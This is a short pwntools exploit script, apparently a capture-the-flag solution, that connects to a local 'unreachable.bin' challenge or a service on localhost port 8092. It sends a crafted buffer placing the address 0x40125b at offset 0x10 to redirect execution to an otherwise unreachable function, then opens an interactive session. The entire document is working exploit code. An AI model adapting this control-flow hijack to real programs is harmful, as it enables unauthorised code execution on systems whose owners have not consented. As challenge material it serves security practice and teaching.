from pwn import *

if 'REMOTE' in args:
    p = remote("localhost", 8092)
else:
    p = process("dist/unreachable.bin")

p.sendlineafter("opt", flat({0: "1\n", 0x10: p64(0x40125b)}))
p.sendlineafter("calc", "8")
p.sendlineafter("a", "0")
p.sendlineafter("b", "0")

p.interactive()
